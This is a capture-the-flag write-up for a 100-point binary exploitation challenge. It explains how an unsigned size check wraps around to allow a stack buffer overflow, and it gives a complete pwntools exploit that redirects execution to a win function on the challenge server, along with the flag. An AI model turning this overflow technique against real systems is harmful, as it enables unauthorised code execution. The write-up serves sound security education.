---
title: "yet another bof pwn"
categories: Binary Exploitation
tags: 
draft: false
completedDuringEvent: true
submitted: true
points: 100
solves: 23
flags: flag: Meta4Sec{e6b760bc7b7f2e252a2c50692c5e4ce3}
---

> this is bof
>
> `nc 117.53.46.98 10000`

by `rui`

---

We were given a file `dist.zip` containing `chall` and `main.c`. Thanks to the problem setter for providing the source code, so we didn’t need to open IDA Pro. By reading the source code, we can identify a buffer overflow vulnerability.

Here is the relevant part of the source code:

```c
int main(){
    char buf[MAX];
    unsigned size;
    printf("size: ");
    scanf("%u", &size);
    if (size + 1 > MAX) {
        printf("no bof pls\n");
        exit(0);
    }
    printf("data: ");
    read(0, buf, size);
    buf[strcspn(buf, "\n")] = '\0';
    return 0;
}
```

The vulnerability lies in the `size + 1` check. When we input `-1` as the size, `size + 1` becomes `0` due to integer underflow. This bypasses the check, and the program proceeds to `read(0, buf, size);` where `size` is interpreted as the maximum value of an `unsigned int`.

This allows us to exploit the program by sending input longer than `MAX`, overwriting the return address of the `main` function, and redirecting execution to the `win` function.

Here is the full exploit:

```python
from pwn import *

BINARY = './dist/chall'

context.log_level = 'debug'
context.binary = BINARY

e = ELF(BINARY)
# r = process(BINARY)
r = remote('117.53.46.98',  10000)

r.sendlineafter(b'size: ', b'-1')
r.sendline(flat([
    cyclic(256),
    cyclic(8),
    e.sym['win']
]))

r.interactive()
```
